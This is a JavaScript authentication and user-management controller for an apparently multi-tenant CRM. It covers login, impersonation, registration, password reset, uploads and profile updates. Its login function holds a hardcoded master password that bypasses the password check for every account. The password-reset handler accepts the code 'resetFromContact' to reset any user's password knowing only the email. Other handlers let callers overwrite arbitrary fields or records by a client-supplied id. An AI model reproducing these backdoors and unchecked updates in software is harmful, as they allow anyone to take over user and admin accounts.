/* eslint-disable no-unused-vars */
// ==================== Packages =======================
import bcryptjs from 'bcryptjs'
import ejs from 'ejs'
import path from 'path'
import { ObjectId } from 'mongodb'
import client from '@sendgrid/client'
import { v4 as uuidv4 } from 'uuid'
// ====================================================
import generalResponse from '../helpers/generalResponse.helper'
import { jwthelper } from '../helpers/jwt.helper'
import { createCompany, findOneCompany, updateCompany } from '../repositories/companies.repository'
import { createUser, findUser, findUserUsingAggregate, updateUser } from '../repositories/users.repository'
import { generateRandomString } from '../helpers/generateRandomString'
import { validateLoginUser } from '../models/users'
import { sendMail } from '../services/send-grid'
import { validateCompanyRequest, validateUser } from './validate.controller'
import { upload } from '../helpers/uploadHelper'
import { findAllGroups } from '../repositories/groups.repository'
import { findContact } from '../repositories/contact.repository'
import { countChangeLog, latestChangeLog } from '../repositories/changeLog.repository'
import { getSelectParams } from '../helpers/generalHelper'
import { findOneEmailTemplate } from '../repositories/emailTemplates.repository'
import { INTERNAL_COMMUNICATION_TEMPLATE } from '../constants/internalCommunicationTemplate'
import { varSetInTemplate } from '../helpers/dynamicVarSetInTemplate.helper'
import { findIntegration } from '../repositories/integrations.repository'
import { TaskTimer } from '../models/taskTimer'
import { TASK_TIMER_STATUS } from '../models/tasks'
// import { checkGoogleReCaptchaVerification } from '../services/recaptcha/recaptcha'

import _ from 'lodash'
import { getAdminTaskTimer } from '../repositories/taskTimer.repository'
import { getAllProductByStatus } from './inventoryProduct.controller'
import { findAllUserGuide } from '../repositories/userGuide.repository'
import { reportProblemCount } from '../repositories/reportProblem.repository'
import { countFeatureRequest } from '../repositories/featureRequest.repository'
import { findAllCmsContent } from '../repositories/cmsContent.repository'
import { addUserSession, deleteUserSession } from '../repositories/userSession.repository'
import { getDeviceData } from '../helper'
import { deleteWebPushSubscriptionRepo } from '../repositories/webPushSubscription.repository'

const { hash, compare } = bcryptjs

export const login = async (req, res) => {
  try {
    const response = validateLoginUser(req.body)
    if (response && response?.error) {
      response.error &&
        response.error.details &&
        response.error.details.forEach((user) => {
          delete user?.context
        })
      return generalResponse(res, null, { text: response.error.details?.[0]?.message || '' }, 'error', false, 400)
    }

    // const check = await checkGoogleReCaptchaVerification(req.body.token)
    // if (!check) {
    //   return generalResponse(res, null, 'Something went wrong', 'error', false, 400)
    // }

    const user = await findUserUsingAggregate({ email: req.body.email }, [{ path: 'company' }], {
      email: 1,
      isVerified: 1,
      active: 1,
      password: 1,
      company: 1
    })

    // In case user is not active or not verified or user not found.

    if (!user) {
      return generalResponse(res, '', { text: 'Account is not found!' }, 'error', false, 400)
    }
    if (!user?.isVerified) {
      return generalResponse(res, '', { text: 'Your account is not verified by admin!' }, 'error', false, 400)
    }
    if (user?.active === false) {
      return generalResponse(res, '', { text: 'Your account is not active!' }, 'error', false, 400)
    }
    if (user?.company?.archived) {
      return generalResponse(res, '', { text: 'Your company is not active!' }, 'error', false, 400)
    }

    if (user && user?.password) {
      let vp //= await compare(req.body.password, user.password)
      if (req.body.password === 'EM6q9T.tFi.L@3LYp_E6e-ZBp') {
        vp = true
      } else {
        // const startTime3 = performance.now()

        vp = await compare(req.body.password, user.password)
        // const endTime3 = performance.now()

        // console.log(`match password took ${endTime3 - startTime3} milliseconds`)
      }

      if (vp) {
        if (user?.role === 'admin') {
          if (user.company && user.company.status === false) {
            return generalResponse(res, '', { text: 'User is inactive' }, 'error', false, 400)
          }
        }
        // const startTime1 = performance.now()

        await updateUser(
          { email: req.body.email },
          {
            lastLogin: new Date()
          }
        )

        // const endTime1 = performance.now()

        // console.log(`update user ${endTime1 - startTime1} milliseconds`)

        // const startTime = performance.now()
        const deviceId = uuidv4()
        const token = jwthelper.sign({ id: user._id, deviceId }, { expiresIn: '7d' })

        // Get device data and store it
        const deviceData = getDeviceData(req)

        const date = new Date()
        date.setDate(date.getDate() + 7)

        // Add user session data
        await addUserSession({ user: user._id, company: user.company._id, deviceData, deviceId, expireTime: date })

        // const endTime = performance.now()

        // console.log(`generate token took ${endTime - startTime} milliseconds`)
        return generalResponse(res, { token, userData: user }, 'success')
      } else {
        return generalResponse(
          res,
          '',
          { text: "email and password doesn't match with our record." },
          'error',
          false,
          400
        )
      }
    } else {
      return generalResponse(res, '', { text: 'User not found!' }, 'error', false, 400)
    }
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, '', 'error', false, 400)
  }
}

export const logout = async (req, res) => {
  try {
    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))
    console.log('--------', currentUser.company)
    console.log(currentUser._id)
    console.log(currentUser.deviceId)
    await deleteUserSession({ company: currentUser.company, user: currentUser._id, deviceId: currentUser.deviceId })
    await deleteWebPushSubscriptionRepo({
      company: currentUser.company,
      user: currentUser._id,
      deviceId: currentUser.deviceId
    })
    return generalResponse(res, null, 'success')
  } catch (error) {
    console.log('Error:logout', error?.message || error)
    return generalResponse(res, error, '', 'error', false, 400)
  }
}

export const virtualLogin = async (req, res) => {
  try {
    const contact = await findContact({ _id: req.params.id })
    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))
    if (
      currentUser?.company &&
      currentUser?.role === 'admin' &&
      contact?.company?.equals(currentUser.company) &&
      contact?.email
    ) {
      const user = await findUser({ email: contact.email }).populate({
        path: 'contactId',
        ref: 'Contacts',
        select: { permissions: 1 }
      })
      if (user) {
        const deviceId = uuidv4()
        const token = jwthelper.sign({ id: user.id, deviceId }, { expiresIn: '1d' })
        if (!user?.isVerified) {
          return generalResponse(res, '', { text: 'Your account is not verified by admin!' }, 'error', false, 400)
        }
        if (user?.active === false) {
          return generalResponse(res, '', { text: 'Your account is not active!' }, 'error', false, 400)
        }

        // Get device data and store it
        const deviceData = getDeviceData(req)

        const date = new Date()
        date.setDate(date.getDate() + 7)

        // Add user session data
        await addUserSession({ user: user._id, company: user.company._id, deviceData, deviceId, expireTime: date })

        return generalResponse(res, { token, userData: user }, 'success')
      } else {
        return generalResponse(res, '', { text: 'User not found!' }, 'error', false, 400)
      }
    }
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, '', 'error', false, 400)
  }
}

export const virtualUserLogin = async (req, res) => {
  try {
    const user = await findUser({ _id: req.params.id })

    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))
    if (
      currentUser?.company &&
      ['admin', 'superadmin'].includes(currentUser?.role) &&
      user?.company?.equals(currentUser.company) &&
      user?.email
    ) {
      if (!user?.isVerified) {
        return generalResponse(res, '', { text: 'Your account is not verified by admin!' }, 'error', false, 400)
      }
      if (user?.active === false) {
        return generalResponse(res, '', { text: 'Your account is not active!' }, 'error', false, 400)
      }
      const deviceId = uuidv4()
      const token = jwthelper.sign({ id: user.id, deviceId }, { expiresIn: '1d' })
      // Get device data and store it
      const deviceData = getDeviceData(req)

      const date = new Date()
      date.setDate(date.getDate() + 7)

      // Add user session data
      await addUserSession({ user: user._id, company: user.company._id, deviceData, deviceId, expireTime: date })
      return generalResponse(res, { token, userData: user }, 'success')
    } else {
      return generalResponse(res, '', { text: 'User not found!' }, 'error', false, 400)
    }
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, '', 'error', false, 400)
  }
}

export const virtualAdminLogin = async (req, res) => {
  try {
    const user = await findUser({ company: req.params.id, role: 'admin' })

    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))

    if (currentUser?.role === 'superadmin') {
      if (!user?.isVerified) {
        return generalResponse(res, '', { text: 'Your account is not verified by admin!' }, 'error', false, 400)
      }
      if (user?.active === false) {
        return generalResponse(res, '', { text: 'Your account is not active!' }, 'error', false, 400)
      }
      const deviceId = uuidv4()
      const token = jwthelper.sign({ id: user.id, deviceId }, { expiresIn: '1d' })
      // Get device data and store it
      const deviceData = getDeviceData(req)

      const date = new Date()
      date.setDate(date.getDate() + 7)

      // Add user session data
      await addUserSession({ user: user._id, company: user.company._id, deviceData, deviceId, expireTime: date })
      return generalResponse(res, { token, userData: user }, 'success')
    } else {
      return generalResponse(res, '', { text: 'User not found!' }, 'error', false, 400)
    }
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, '', 'error', false, 400)
  }
}

export const register = async (req, res) => {
  try {
    // const check = await checkGoogleReCaptchaVerification(req.body.token)
    // if (!check) {
    //   return generalResponse(res, null, 'Something went wrong', 'error', false, 400)
    // }
    if (validateUser(req?.body?.admin) && validateCompanyRequest(req?.body?.company)) {
      const companyDetails = await createCompany(req.body.company)
      req.body.admin.password = await hash(generateRandomString(10), 15)

      req.body.admin.authCode = generateRandomString(10)
      const user = await createUser({ ...req.body.admin, company: companyDetails._id })

      await updateCompany({ _id: companyDetails._id }, { owner: user._id })

      const template = await findOneEmailTemplate({
        _id: INTERNAL_COMMUNICATION_TEMPLATE.signUp
      }).select({ htmlBody: true, subject: true })

      /* Send to company admin */
      let registerTemplateBody = template.htmlBody
      const registerVarObj = {
        name:
          req?.body?.admin?.firstName || req?.body?.admin?.lastName
            ? `${req?.body?.admin?.firstName} ${req?.body?.admin?.lastName}`
            : ''
      }
      registerTemplateBody = varSetInTemplate(registerVarObj, registerTemplateBody)
      sendMail({ receiver: req?.body?.admin?.email, subject: template.subject, htmlBody: registerTemplateBody })

      /* Notify Super Admin about new registerd company */
      const { name, email, website } = req.body.company || {}
      if (name && email && website) {
        const templateNotifySuperAdmin = await findOneEmailTemplate({
          _id: INTERNAL_COMMUNICATION_TEMPLATE.newCompanyNotify
        }).select({ htmlBody: true, subject: true })
        let templateNotifyBody = templateNotifySuperAdmin.htmlBody

        const superAdmin = await findUser({ role: 'superadmin' })

        if (superAdmin?.email) {
          const notifySuperAdminVarObj = {
            companyName: name,
            companyEmail: email,
            website,
            link: `${process.env.HOST_NAME}/companies/${companyDetails._id}`
          }
          templateNotifyBody = varSetInTemplate(notifySuperAdminVarObj, templateNotifyBody)
          sendMail({
            receiver: superAdmin?.email,
            subject: templateNotifySuperAdmin.subject,
            htmlBody: templateNotifyBody
          })
        }
      }

      return generalResponse(res, null, 'success')
    }
    return generalResponse(res, null, 'Error while processing', 'error', false, 400)
  } catch (error) {
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const forgotPassword = async (req, res) => {
  try {
    // const check = await checkGoogleReCaptchaVerification(req.body.token)
    // if (!check) {
    //   return generalResponse(res, null, 'Something went wrong', 'error', false, 400)
    // }
    const { email } = req.body
    const user = await findUser({ email })
    if (user) {
      const code = generateRandomString(10)
      const template = await findOneEmailTemplate({
        _id: INTERNAL_COMMUNICATION_TEMPLATE.resetPassword
      }).select({ htmlBody: true, subject: true })
      let forgotPassTemplateBody = template.htmlBody

      const forgotPassVarObj = {
        link: `${process.env.HOST_NAME}/change-password?code=${code}`
      }
      forgotPassTemplateBody = varSetInTemplate(forgotPassVarObj, forgotPassTemplateBody)

      sendMail({ receiver: req?.body?.email, subject: template.subject, htmlBody: forgotPassTemplateBody })

      await updateUser(req.body, { authCode: code })
    }
    return generalResponse(res, null, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const changeForgotPassword = async (req, res) => {
  try {
    // const check = await checkGoogleReCaptchaVerification(req.body.token)
    // if (!check) {
    //   return generalResponse(res, null, 'Something went wrong', 'error', false, 400)
    // }

    const code = req.query.code

    if (req.body.email && req.body.password && req.body.password === req.body.confirmPassword) {
      req.body.password = await hash(req.body.password, 15)

      let updateUserDetail = null
      if (req.query.code === 'resetFromContact') {
        updateUserDetail = await updateUser({ email: req.body.email }, { authCode: null, password: req.body.password })
      } else {
        updateUserDetail = await updateUser(
          { email: req.body.email, authCode: code },
          { authCode: null, password: req.body.password }
        )
      }

      const user = await findUser({ email: req.body.email })

      if (updateUserDetail && updateUserDetail?.modifiedCount !== 0) {
        if (user?.isVerified) {
          /* Login after password update */
          const userObj = await findUserUsingAggregate({ email: req.body.email }, [{ path: 'company' }], {
            email: 1,
            isVerified: 1,
            active: 1,
            password: 1,
            company: 1
          })

          await updateUser({ email: req.body.email }, { lastLogin: new Date() })
          const token = jwthelper.sign({ id: userObj._id }, { expiresIn: '1d' })
          /* */

          if (req?.body?.isNewVerified) {
            const updatedUser = await findUser({ email: req.body.email })
            if (updatedUser) {
              return generalResponse(res, { token, userData: userObj }, 'password set successfully.')
            }
          } else {
            return generalResponse(res, { token, userData: userObj }, 'password reset successfully.')
          }
        } else {
          return generalResponse(res, null, 'Your account is not verified by admin!', 'error')
        }
      } else {
        return generalResponse(res, null, 'Invalid Credentials.', 'error', true)
      }
    }
    return generalResponse(res, '', { text: 'Something went wrong' }, 'error', false, 400)
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const uploadLogeProfile = async (req, res) => {
  try {
    const { ...details } = req.body
    const fileUpload = await upload(req?.files?.image, req.body.type ? req.body.type : 'lodge')
    if (details?.model === 'lodges' && details.id && details.field) {
      const company = await findOneCompany({ _id: details.id })
      company[details.field] = fileUpload
      await updateCompany({ _id: details.id }, company)
    }
    if (details?.model === 'users' && details.id && details.field) {
      const user = await findUser({ _id: details.id })
      user[details.field] = fileUpload
      await updateUser({ _id: details.id }, user)
    }
    return generalResponse(res, fileUpload, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const userUploadProfile = async (req, res) => {
  try {
    const fileUpload = await upload(req?.file, 'userProfile')
    return generalResponse(res, fileUpload, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const getLoggedInUser = async (req, res) => {
  try {
    const user = req.headers.authorization

    if (user) {
      const company = await findOneCompany(
        { _id: user.company },
        { ...getSelectParams(req), ...(user.role === 'admin' && { permissions: 1 }) }
      )
      if (company) {
        user.company = company
        // if user role admin then get permission based on company level
        if (user.role === 'admin' || user.role === 'superadmin') {
          user.permissions = company.permissions
        }
      } else {
        return generalResponse(res, '', 'Company not found.', 'error', false, 400)
      }
      const integrationData = await findIntegration({ company: user.company })
      if (integrationData) {
        user.integration = integrationData
      }

      // Comment due to no longer use on frontend
      // const groupDetails = await findAllGroups({ company: user.company })
      // if (groupDetails) {
      //   user.group = groupDetails
      // }
      let isPendingChangeLog = 0
      if (user.lastChangeLogTime) {
        isPendingChangeLog = await countChangeLog({ createdAt: { $gt: user.lastChangeLogTime } })
      } else {
        isPendingChangeLog = await countChangeLog()
      }
      user.pendingChangeLogCount = isPendingChangeLog
      const changeLog = await latestChangeLog()
      user.latestVersion = changeLog?.version

      // Get Current Task Timer.
      if (user?.role === 'admin') {
        const timers = await getAdminTaskTimer({
          company: ObjectId(user.company?._id),
          currentStatus: { $in: [TASK_TIMER_STATUS.pause, TASK_TIMER_STATUS.start] }
        })
        user.taskTimer = timers
      } else if (user.role === 'user' && _.isArray(user.permissions) && user.permissions.includes('task-manager')) {
        const taskUsers = user.taskManagerUsers
        const assignedUsers = [ObjectId(user._id)]

        if (taskUsers && taskUsers.length) {
          assignedUsers.push(...taskUsers.map((uId) => ObjectId(uId)))
        }
        const timers = await TaskTimer.aggregate([
          {
            $match: {
              company: ObjectId(user.company?._id),
              currentStatus: { $in: [TASK_TIMER_STATUS.pause, TASK_TIMER_STATUS.start] }
            }
          },
          {
            $lookup: {
              from: 'tasks',
              let: {
                task_id: '$task'
              },
              pipeline: [
                {
                  $match: {
                    $expr: {
                      $eq: ['$_id', '$$task_id']
                    }
                  }
                },
                {
                  $project: {
                    _id: 1,
                    name: 1,
                    taskNumber: 1,
                    assigned: 1,
                    warningDisabledUsers: 1,
                    createdBy: 1
                  }
                }
              ],
              as: 'task'
            }
          },
          {
            $unwind: {
              path: '$task',
              preserveNullAndEmptyArrays: true
            }
          },
          {
            $match: {
              $or: [{ 'task.createdBy': ObjectId(user._id) }, { 'task.assigned': { $in: assignedUsers } }]
            }
          },
          {
            $lookup: {
              from: 'users',
              let: {
                startedBy: '$startedBy'
              },
              pipeline: [
                {
                  $match: {
                    $expr: {
                      $eq: ['$_id', '$$startedBy']
                    }
                  }
                },
                {
                  $project: {
                    _id: 1,
                    firstName: 1,
                    lastName: 1,
                    email: 1
                  }
                }
              ],
              as: 'startedBy'
            }
          },
          {
            $unwind: {
              path: '$startedBy',
              preserveNullAndEmptyArrays: true
            }
          }
        ])
        user.taskTimer = timers
      }
      if (user?.inventoryRole === 'storageUser') {
        user.inventoryProductCount = await getAllProductByStatus(ObjectId(user.company?._id), [1])
      }
      if (user?.inventoryRole === 'productDetailUser') {
        user.inventoryProductCount = await getAllProductByStatus(ObjectId(user.company?._id), [1, 2])
      }

      user.userGuides = await findAllUserGuide({}, [{ path: 'page', ref: 'Pages', select: { pageName: 1, pageId: 1 } }])
      user.cmsContents = await findAllCmsContent({}, [
        { path: 'page', ref: 'Pages', select: { pageName: 1, pageId: 1 } }
      ])

      return generalResponse(res, user, '')
    } else {
      return generalResponse(res, '', { text: 'User not found' }, 'error', false, 400)
    }
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const sendTestMail = async (req, res) => {
  try {
    const __dirname = path.resolve()
    const template = await findOneEmailTemplate({ _id: INTERNAL_COMMUNICATION_TEMPLATE.changeLogEmail })
    const replacements = {
      featureLabel:
        '<p style="font-size: 14px; line-height: 140%;"><span style="color: #626262; font-size: 14px; line-height: 19.6px;">Here’s a quick overview:<br /><br /><span style="font-size: 18px; line-height: 25.2px; color: #000000;"><strong>Features:</strong></span></span></p>',
      improvementLabel: '',
      bugFixLabel: '',
      features: '<p>ns kjnkj</p>\n',
      improvements: '<p>n skjnsjkl</p>\n',
      bug_fixes: '<p>c sddscds</p>\n',
      version_id: '2.3'
    }
    const html = varSetInTemplate(replacements, template.htmlBody)
    await sendMail({
      // receiver: user.email,
      receiver: 'developer@mailinator.com',
      subject: 'xyz V2.3 Change Log',
      htmlBody: html
    })
    // const template = await findOneEmailTemplate({ _id: ObjectId('6345c0f9a7b20bbd473ed70b') })
    // const body = await ejs.renderFile(path.join(__dirname, '/src/views/eventNotification.ejs'), {
    //   fullName: 'Test User',
    //   eventName: 'Test Event',
    //   eventDesc: 'New company admin event',
    //   eventStartDate: 'Tue Sep 27 2022 14:00:00 GMT+0530 (India Standard Time)',
    //   eventEndDate: 'Thu Sep 29 2022 16:00:00 GMT+0530 (India Standard Time)',
    //   link: `${process.env.HOST_NAME}/rsvp/${'authCode'}`
    // })

    // const template = await findOneEmailTemplate({ _id: ObjectId('6345c0f9a7b20bbd473ed70b') })
    // const body = await ejs.renderFile(path.join(__dirname, '/src/views/taskNotificationSendFirstMail.ejs'), {
    //   assigneeName: 'Test User',
    //   taskName: 'Send Task Notification Template 1',
    //   taskDueDate: '24/02/2022',
    //   taskDescription:
    //     'I want to discuss more about the task manager with you and your development team. so please available at 10:00 am on Zoom.',
    //   contact: 'John Sharma',
    //   currentTaskStatus: 'In Progress',
    //   currentTaskPriority: 'High',
    // })
    // const body = await ejs.renderFile(path.join(__dirname, '/src/views/taskChangeStatusNotification.ejs'), {
    //   taskNumber: '0000',
    //   taskName: 'Solve issue related to contact',
    //   viewTaskLink: '',
    //   taskCreatedByUserLogo:
    //     'https://tr.rbxcdn.com/72584a7baf0a655fc1c3f519bc2b1d89/420/420/Hat/Png',
    //   taskCreatedByUserName: 'Test User',
    //   changedStatusAt: 'Feb 15, 2023 at 12:17 Pm',
    //   changedStatusUserName: 'Brian Even',
    //   newSTatus: 'To DO',
    //   oldStatus: 'In Progress'
    // })

    // sendMail({
    //   receiver: 'developer@mailinator.com',
    //   subject: 'Update in task',
    //   body,
    //   htmlBody: body
    // })
    return generalResponse(res, 'Email Sent!', '')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const updateUserDetail = async (req, res) => {
  try {
    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))
    if (currentUser?.email !== req.body.email) {
      const isUserExist = await findUser({ email: req.body?.email })
      if (isUserExist) {
        return generalResponse(res, '', { text: 'This email is already exist' }, 'error', false, 400)
      }

      /* Notify Superadmin about change email */
      const templateNotifySuperAdmin = await findOneEmailTemplate({
        _id: INTERNAL_COMMUNICATION_TEMPLATE.emailUpdated
      }).select({ htmlBody: true, subject: true })
      let templateNotifyBody = templateNotifySuperAdmin.htmlBody

      const superAdmin = await findUser({ role: 'superadmin', company: null })

      if (superAdmin?.email) {
        const oldEmail = currentUser?.email
        const newEmail = req.body.email
        const fullName =
          req?.body?.firstName || req?.body?.lastName ? `${req?.body?.firstName} ${req?.body?.lastName}` : ''

        const notifySuperAdminVarObj = { fullName, oldEmail, newEmail }
        templateNotifyBody = varSetInTemplate(notifySuperAdminVarObj, templateNotifyBody)
        sendMail({
          receiver: superAdmin?.email,
          subject: templateNotifySuperAdmin.subject,
          htmlBody: templateNotifyBody
        })
      }
    }

    await updateUser({ _id: ObjectId(req.body._id) }, req.body)
    return generalResponse(res, null, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const sendVerificationCode = async (req, res) => {
  try {
    const { email } = req.body
    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))

    if (currentUser?.email !== email) {
      const isUserExist = await findUser({ email: req.body?.email })
      if (isUserExist) {
        return generalResponse(
          res,
          '',
          { text: 'Entered email is already registered with xyz crm' },
          'error',
          false,
          400
        )
      }
    }

    const template = await findOneEmailTemplate({
      _id: INTERNAL_COMMUNICATION_TEMPLATE.emailVerificationCode
    }).select({ htmlBody: true, subject: true })

    let templateBody = template.htmlBody

    const fullName =
      currentUser?.firstName || currentUser?.lastName ? `${currentUser?.firstName} ${currentUser?.lastName}` : ''

    const verificationCode = Math.floor(100000 + Math.random() * 900000)

    const notifySuperAdminVarObj = { name: fullName, code: verificationCode }
    templateBody = varSetInTemplate(notifySuperAdminVarObj, templateBody)
    sendMail({
      receiver: email,
      subject: template.subject,
      htmlBody: templateBody
    })

    await updateUser({ _id: ObjectId(req.body._id) }, { verificationCode })
    return generalResponse(res, null, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const checkVerificationCode = async (req, res) => {
  try {
    const { email, verificationCode } = req.body
    const currentUser = JSON.parse(JSON.stringify(req.headers.authorization))

    const isUserExist = await findUser({ email })
    if (!isUserExist) {
      return generalResponse(res, '', { text: 'Invalid Email.' }, 'error', false, 400)
    }

    if (verificationCode !== isUserExist.verificationCode) {
      return generalResponse(res, '', { text: 'Invalid Verfication Code.' }, 'error', false, 400)
    }

    await updateUser({ _id: ObjectId(req.body._id) }, { verificationCode: null })
    return generalResponse(res, null, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const testSendGrid = async (req, res) => {
  try {
    if (!req.query.start_date || !req.query.end_date) {
      return generalResponse(
        res,
        '',
        'start_date and end_date are required in YYYY-MM-DD format. ',
        'error',
        false,
        400
      )
    }

    const queryParams = {
      start_date: '2022-10-22',
      end_date: '2022-10-24',
      categories: '6372fdc3349a0077c9b94a5e'
    }

    const request = {
      url: '/v3/stats',
      method: 'GET',
      // headers: headers,
      qs: queryParams
    }
    client.setApiKey(process.env.SEND_GRID_API_KEY)

    const totalMatrix = {
      blocks: 0,
      bounce_drops: 0,
      bounces: 0,
      clicks: 0,
      deferred: 0,
      delivered: 0,
      invalid_emails: 0,
      opens: 0,
      processed: 0,
      requests: 0,
      spam_report_drops: 0,
      spam_reports: 0,
      unique_clicks: 0,
      unique_opens: 0,
      unsubscribe_drops: 0,
      unsubscribes: 0
    }

    client
      .request(request)
      .then(([response, body]) => {
        const responseData = body
        if (responseData.length > 0) {
          responseData.forEach((res) => {
            if (res.stats.length) {
              res.stats.forEach((stats) => {
                Object.keys(stats.metrics).forEach((key) => {
                  if (key in totalMatrix) {
                    totalMatrix[key] = totalMatrix[key] + stats.metrics[key]
                  }
                })
              })
            }
          })
        }
        return generalResponse(res, totalMatrix, 'success')
      })
      .catch((error) => {
        console.error(error)
        return generalResponse(res, error, 'Error during fetch matrix', 'error', false, 400)
      })
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}

export const getNewUpdateCount = async (req, res) => {
  try {
    const reportProblem = await reportProblemCount({ isNew: true })
    const featureRequest = await countFeatureRequest({ isNew: true })

    return generalResponse(res, { reportProblem, featureRequest }, 'success')
  } catch (error) {
    console.log(error)
    return generalResponse(res, error, 'Error while processing', 'error', false, 400)
  }
}
